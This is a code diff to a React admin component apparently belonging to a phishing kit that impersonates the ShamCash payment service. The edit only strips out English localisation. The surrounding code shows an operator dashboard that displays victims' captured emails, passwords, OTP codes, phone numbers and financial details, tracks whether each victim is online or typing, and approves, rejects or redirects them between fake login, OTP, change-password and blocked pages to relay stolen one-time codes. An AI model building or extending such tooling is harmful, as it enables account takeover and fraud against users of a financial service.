@@ -7,7 +7,6 @@ import {
   RefreshCw, PenLine, Send, X, LogOut
 } from "lucide-react";
 
-type Lang = "ar" | "en";
 type VisitorStatus = "connected" | "typing" | "submitted" | "disconnected";
 type OtpStatus = "pending" | "approved" | "rejected" | "redirected" | null;
 type PassStatus = "pending" | "approved" | "rejected" | null;
@@ -90,30 +89,8 @@ const T_AR = {
   activeVisitors: "زوار نشطون", lang: "EN", logout: "خروج",
   notSubmitted: "لم يرسل بعد", waiting: "في الانتظار...",
 };
-const T_EN = {
-  title: "Control Panel", visitors: "Visitor List", search: "Search (name, phone, email...)",
-  all: "All", active: "Active", submitted: "Submitted", noVisitors: "No visitors yet",
-  noVisitorsSub: "Records will appear when the first request is submitted",
-  selectVisitor: "Select a visitor", selectVisitorSub: "Choose from the list to view details",
-  credentials: "Login Credentials", email: "Email", password: "Password",
-  otpCode: "OTP Code", phone: "Phone", loan: "Loan Amount", income: "Monthly Income",
-  otpSection: "OTP Verification", basicInfo: "Basic Information", loanInfo: "Request Details",
-  page: "Current Page", submittedTime: "Submission Time", lastSeen: "Last Seen",
-  redirectTo: "Redirect Visitor", redirectLogin: "Login Page", redirectOtp: "OTP Page",
-  redirectChangepass: "Change Password Page", redirectBlocked: "Blocked Page",
-  approve: "Approve ✓", reject: "Reject ✗", sendToOtp: "Send to OTP",
-  sendToChangepass: "Send to Change Password",
-  statusConnected: "Connected", statusTyping: "Typing...", statusSubmitted: "Submitted",
-  statusDisconnected: "Offline", otpPending: "Awaiting Approval",
-  otpApproved: "Approved", otpRejected: "Rejected", otpRedirected: "Redirected",
-  passPending: "Awaiting Approval", passApproved: "Changed", passRejected: "Rejected",
-  connectedNow: "Online Now", liveUser: "Live User", clearAll: "Clear All",
-  activeVisitors: "Active Visitors", lang: "AR", logout: "Logout",
-  notSubmitted: "Not submitted yet", waiting: "Waiting...",
-};
 
 export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
-  const [lang, setLang] = useState<Lang>("ar");
   const [submissions, setSubmissions] = useState<Submission[]>([]);
   const [selected, setSelected] = useState<string | null>(null);
   const [filter, setFilter] = useState<"all" | "active" | "submitted">("all");
@@ -125,8 +102,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
   const prevLiveId = useRef<string | null>(null);
   const prevLiveStatus = useRef<VisitorStatus>("disconnected");
 
-  const T = lang === "ar" ? T_AR : T_EN;
-  const isRtl = lang === "ar";
+  const T = T_AR;
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -261,10 +237,10 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
   };
 
   return (
-    <div className="flex h-screen w-full overflow-hidden bg-[#0b1120] text-white" dir={isRtl ? "rtl" : "ltr"} style={{ fontFamily: "'Inter', system-ui, sans-serif" }}>
+    <div className="flex h-screen w-full overflow-hidden bg-[#0b1120] text-white" dir="rtl" style={{ fontFamily: "'Inter', system-ui, sans-serif" }}>
 
       {/* RIGHT PANEL — VISITORS LIST */}
-      <div className={`flex h-full w-full flex-col border-[#1e2a45] bg-[#0d1526] ${selectedSub ? "hidden sm:flex sm:w-[340px]" : "flex"} sm:flex sm:w-[340px] flex-shrink-0 ${isRtl ? "border-l" : "border-r"}`}>
+      <div className={`flex h-full w-full flex-col border-l border-[#1e2a45] bg-[#0d1526] ${selectedSub ? "hidden sm:flex sm:w-[340px]" : "flex"} sm:flex sm:w-[340px] flex-shrink-0`}>
 
         {/* Header */}
         <div className="flex items-center justify-between px-4 pt-4 pb-3 border-b border-[#1e2a45]">
@@ -274,17 +250,13 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
             </div>
             <div>
               <p className="text-[13px] font-extrabold text-white/90">{T.visitors}</p>
-              <p className="text-[10px] text-[#c9ccdb]/40">{submissions.length} {T_AR.lang === lang ? "سجل" : "records"}</p>
+              <p className="text-[10px] text-[#c9ccdb]/40">{submissions.length} سجل</p>
             </div>
           </div>
           <div className="flex items-center gap-2">
             {hasNew && (
               <div className="h-2 w-2 rounded-full bg-[#e54343] animate-pulse ring-2 ring-[#0d1526]" />
             )}
-            <button onClick={() => setLang(l => l === "ar" ? "en" : "ar")}
-              className="rounded-[6px] bg-white/5 px-2 py-1 text-[10px] font-bold text-white/50 hover:bg-white/10">
-              {T.lang}
-            </button>
             {onLogout && (
               <button onClick={onLogout} className="rounded-[6px] bg-white/5 p-1.5 text-white/40 hover:bg-red-500/20 hover:text-red-400 transition-colors">
                 <LogOut className="h-3.5 w-3.5" />
@@ -313,7 +285,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
               onChange={(e) => setSearch(e.target.value)}
               placeholder={T.search}
               className="flex-1 bg-transparent text-[12px] text-white/80 outline-none placeholder:text-white/25"
-              dir={isRtl ? "rtl" : "ltr"}
+              dir="rtl"
             />
           </div>
         </div>
@@ -355,7 +327,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                     ? "bg-[#1a2a55] border-[#657bd8]/50 shadow-[0_0_12px_rgba(101,123,216,0.15)]"
                     : "bg-[#121d35] border-[#1e2a45] hover:bg-[#162038] hover:border-[#2a3a5a]"
                     }`}
-                  dir={isRtl ? "rtl" : "ltr"}
+                  dir={"rtl"}
                 >
                   <div className="flex items-start justify-between gap-2">
                     <div className="flex items-center gap-2 min-w-0">
@@ -463,7 +435,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                     <ChevronDown className="h-3 w-3" />
                   </button>
                   {showRedirect && (
-                    <div className={`absolute top-full mt-1 z-50 rounded-[12px] bg-[#131e35] border border-[#1e2a45] shadow-2xl overflow-hidden min-w-[180px] ${isRtl ? "left-0" : "right-0"}`}>
+                    <div className={`absolute top-full mt-1 z-50 rounded-[12px] bg-[#131e35] border border-[#1e2a45] shadow-2xl overflow-hidden min-w-[180px] ${"left-0"}`}>
                       {[
                         { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3.5 w-3.5" />, color: "text-white/70" },
                         { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3.5 w-3.5" />, color: "text-[#657bd8]" },
@@ -472,7 +444,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                       ].map((opt) => (
                         <button key={opt.cmd} onClick={() => { sendCmd(opt.cmd); setShowRedirect(false); }}
                           className={`flex w-full items-center gap-2.5 px-4 py-3 text-[12px] font-semibold ${opt.color} hover:bg-white/5 transition-colors`}
-                          dir={isRtl ? "rtl" : "ltr"}>
+                          dir={"rtl"}>
                           {opt.icon}{opt.label}
                         </button>
                       ))}
@@ -574,7 +546,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                   {[
                     { label: T.phone, value: selectedSub.phone, icon: <Phone className="h-3 w-3" />, dir: "ltr" },
                     { label: T.submittedTime, value: selectedSub.submittedAt, icon: <Clock className="h-3 w-3" />, dir: "ltr" },
-                    { label: T.page, value: selectedSub.page, icon: <MapPin className="h-3 w-3" />, dir: isRtl ? "rtl" : "ltr" },
+                    { label: T.page, value: selectedSub.page, icon: <MapPin className="h-3 w-3" />, dir: "rtl" },
                   ].map((row) => (
                     <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
                       <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
